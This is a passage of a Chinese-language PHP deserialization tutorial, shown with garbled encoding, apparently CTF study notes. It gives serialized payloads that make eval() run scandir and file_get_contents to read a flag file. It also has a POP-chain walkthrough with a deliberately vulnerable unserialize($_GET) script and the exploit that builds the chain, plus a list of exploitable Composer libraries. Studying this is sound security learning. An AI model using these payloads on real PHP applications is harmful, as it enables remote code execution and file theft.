<span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ¥ç€æååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//å¾—åˆ°ï¼šO:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>é˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰é¢åŠ ä¸Š\å¾—åˆ°<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715000429267.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨ phpinfo å¾—çŸ¥æ ¹ç›®å½•ä¸º<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p>
<p>ä¿®æ”¹ä¼ å¼•ç”¨ä¸º<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p>
<p>åŒæ ·çš„æ–¹æ³•å¾—åˆ° payloadï¼š<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715001047516.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="POP-é“¾"><a href="#POP-é“¾" class="headerlink" title="POP é“¾"></a>POP é“¾</h2><h3 id="POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"><a href="#POPï¼šé¢å‘å±æ€§ç¼–ç¨‹" class="headerlink" title="POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"></a>POPï¼šé¢å‘å±æ€§ç¼–ç¨‹</h3><p>é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼‰ ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚åœ¨æ§åˆ¶ä»£ç æˆ–è€…ç¨‹åºçš„æ‰§è¡Œæµç¨‹åå°±èƒ½å¤Ÿä½¿ç”¨è¿™ä¸€ç»„è°ƒç”¨é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œã€‚</p>
<p>åœ¨äºŒè¿›åˆ¶åˆ©ç”¨æ—¶ï¼ŒROP é“¾æ„é€ ä¸­æ˜¯å¯»æ‰¾å½“å‰ç³»ç»Ÿç¯å¢ƒä¸­æˆ–è€…å†…å­˜ç¯å¢ƒé‡Œå·²ç»å­˜åœ¨çš„ã€å…·æœ‰å›ºå®šåœ°å€ä¸”å¸¦æœ‰è¿”å›æ“ä½œçš„æŒ‡ä»¤é›†ï¼Œè€Œ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚<br>äºŒè¿›åˆ¶ä¸­é€šå¸¸æ˜¯ç”±äºå†…å­˜æº¢å‡ºæ§åˆ¶äº†æŒ‡ä»¤æ‰§è¡Œæµç¨‹ï¼Œè€Œååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯æ§åˆ¶ä»£ç æ‰§è¡Œæµç¨‹çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå‰æï¼š<strong>è¿›è¡Œååºåˆ—åŒ–çš„æ•°æ®èƒ½å¤Ÿè¢«ç”¨æˆ·è¾“å…¥æ‰€æ§åˆ¶ã€‚</strong></p>
<h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>ä¼ ç»Ÿçš„ PHP è¦æ±‚åº”ç”¨ç¨‹åºå¯¼å…¥æ¯ä¸ªç±»ä¸­çš„æ‰€æœ‰ç±»æ–‡ä»¶ï¼Œè¿™æ ·å°±æ„å‘³ç€æ¯ä¸ª PHP æ–‡ä»¶éœ€è¦ä¸€åˆ—é•¿é•¿çš„ include æˆ– require æ–¹æ³•ï¼Œè€Œåœ¨å½“å‰ä¸»æµçš„ PHP æ¡†æ¶ä¸­ï¼Œéƒ½é‡‡ç”¨äº† Autoloading è‡ªåŠ¨åŠ è½½ç±»æ¥å®Œæˆè¿™æ ·ç¹é‡çš„å·¥ä½œã€‚åœ¨å®Œå–„ç®€åŒ–äº†ç±»ä¹‹é—´è°ƒç”¨çš„åŠŸèƒ½çš„åŒæ—¶ï¼Œä¹Ÿä¸ºåºåˆ—åŒ–æ¼æ´é€ æˆäº†ä¾¿æ·ã€‚Composer æ˜¯ PHP ç”¨æ¥ç®¡ç†ä¾èµ–ï¼ˆdependencyï¼‰å…³ç³»çš„å·¥å…·ã€‚ä½ å¯ä»¥åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­å£°æ˜æ‰€ä¾èµ–çš„å¤–éƒ¨å·¥å…·åº“ï¼ˆlibrariesï¼‰ï¼ŒComposer ä¼šå¸®ä½ å®‰è£…è¿™äº›ä¾èµ–çš„åº“æ–‡ä»¶ã€‚Composer é»˜è®¤æ˜¯ä» Packagist æ¥ä¸‹è½½ä¾èµ–åº“çš„ã€‚<br>æ‰€ä»¥æˆ‘ä»¬æŒ–æ˜æ¼æ´çš„æ€è·¯å°±å¯ä»¥ä»ä¾èµ–åº“æ–‡ä»¶å…¥æ‰‹ã€‚</p>
<p>1.ä»å¯èƒ½å­˜åœ¨æ¼æ´çš„ä¾èµ–åº“æ–‡ä»¶å…¥æ‰‹ å¯ä»¥ä½¿ç”¨ä»£ç å®¡è®¡å·¥å…·æˆ–è€…å…¨å±€æ‰‹åŠ¨æœç´¢__wakeup()å’Œ__destruct()</p>
<p>åœ¨ composer.json ä¸­å­˜åœ¨ä»¥ä¸‹ç»„ä»¶å°±è¦å¼•èµ·æ³¨æ„äº†</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">ä»»æ„å†™<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>ä»»æ„åˆ é™¤<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure>

<p>2.ä»åº”ç”¨çš„ä»£ç æ¡†æ¶çš„é€»è¾‘ä¸Šå…¥æ‰‹</p>
<p>3.ä» PHP è¯­è¨€æœ¬èº«æ¼æ´å…¥æ‰‹</p>
<h3 id="POP-é“¾åˆ©ç”¨"><a href="#POP-é“¾åˆ©ç”¨" class="headerlink" title="POP é“¾åˆ©ç”¨"></a>POP é“¾åˆ©ç”¨</h3><p>æœ‰ä¸¤ç§æƒ…å½¢ï¼š</p>
<ul>
<li>åœ¨ PHP é­”æœ¯æ–¹æ³•ä¸­å‡ºç°ç¼ºé™·ä»£ç ï¼Œè‡ªåŠ¨è°ƒç”¨è€Œè§¦å‘æ¼æ´</li>
<li>ç¼ºé™·ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å°±è¦å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åï¼Œå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°(èƒ½èƒŒåˆ©ç”¨çš„åŒåå‡½æ•°)çš„å±æ€§è”ç³»èµ·æ¥ã€‚</li>
</ul>
<h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°éœ€è¦æ‰§è¡Œ GetFlag ç±»ä¸­çš„ get_flag()å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ã€‚è¦è®©è¿™ä¸ªæ–¹æ³•æ‰§è¡Œï¼Œéœ€è¦æ„é€ ä¸€ä¸ª POP é“¾ã€‚</p>
<ol>
<li><p><code>string1</code>ä¸­çš„<code>__tostring</code>å­˜åœ¨<code>$this-&gt;str1-&gt;get_flag()</code>ï¼Œåˆ†æä¸€ä¸‹è¦è‡ªåŠ¨è°ƒç”¨<code>__tostring()</code>éœ€è¦æŠŠç±»<code>string1</code>å½“æˆå­—ç¬¦ä¸²æ¥ä½¿ç”¨ï¼Œå› ä¸ºè°ƒç”¨çš„æ˜¯å‚æ•°<code>str1</code>çš„æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æŠŠ<code>str1</code>èµ‹å€¼ä¸ºç±»<code>GetFlag</code>çš„å¯¹è±¡ã€‚</p>
</li>
<li><p>å‘ç°ç±»<code>func</code>ä¸­å­˜åœ¨<code>__invoke</code>æ–¹æ³•æ‰§è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œéœ€è¦æŠŠ<code>func</code>å½“æˆå‡½æ•°ä½¿ç”¨è‡ªåŠ¨è°ƒç”¨<code>__invoke</code>ç„¶åæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>string1</code>çš„å¯¹è±¡ä¸<code>$mod2</code>æ‹¼æ¥ã€‚</p>
</li>
<li><p>åœ¨<code>funct</code>ä¸­æ‰¾åˆ°äº†å‡½æ•°è°ƒç”¨ï¼Œéœ€è¦æŠŠ<code>mod1</code>èµ‹å€¼ä¸º<code>func</code>ç±»çš„å¯¹è±¡ï¼Œåˆå› ä¸ºå‡½æ•°è°ƒç”¨åœ¨<code>__call</code>æ–¹æ³•ä¸­ï¼Œä¸”å‚æ•°ä¸º<code>$test2</code>,å³æ— æ³•è°ƒç”¨<code>test2</code>æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ <code>__call</code>æ–¹æ³•ï¼›</p>
</li>
<li><p>åœ¨<code>Call</code>ä¸­çš„<code>test1</code>æ–¹æ³•ä¸­å­˜åœ¨<code>$this-&gt;mod1-&gt;test2();</code>ï¼Œéœ€è¦æŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>funct</code>çš„å¯¹è±¡ï¼Œè®©<code>__call</code>è‡ªåŠ¨è°ƒç”¨ã€‚</p>
</li>
<li><p>æŸ¥æ‰¾<code>test1</code>æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œåœ¨<code>start_gg</code>ä¸­å‘ç°<code>$this-&gt;mod1-&gt;test1();</code>ï¼ŒæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>start_gg</code>ç±»çš„å¯¹è±¡ï¼Œç­‰å¾…<code>__destruct()</code>è‡ªåŠ¨è°ƒç”¨ã€‚</p>
</li>
</ol>
<p>æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//æŠŠ$mod1èµ‹å€¼ä¸ºCallç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfunctç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfuncç±»å¯¹è±¡</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºstring1ç±»å¯¹è±¡</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//æŠŠ $str1èµ‹å€¼ä¸ºGetFlagç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//æ„é€ start_ggç±»å¯¹è±¡$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//æ˜¾ç¤ºè¾“å‡ºurlç¼–ç åçš„åºåˆ—åŒ–å¯¹è±¡</span><br></code></pre></td></tr></table></figure>

<h4 id="2021-å¼ºç½‘æ¯èµŒå¾’"><a href="#2021-å¼ºç½‘æ¯èµŒå¾’" class="headerlink" title="2021 å¼ºç½‘æ¯èµŒå¾’"></a>2021 å¼ºç½‘æ¯èµŒå¾’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs 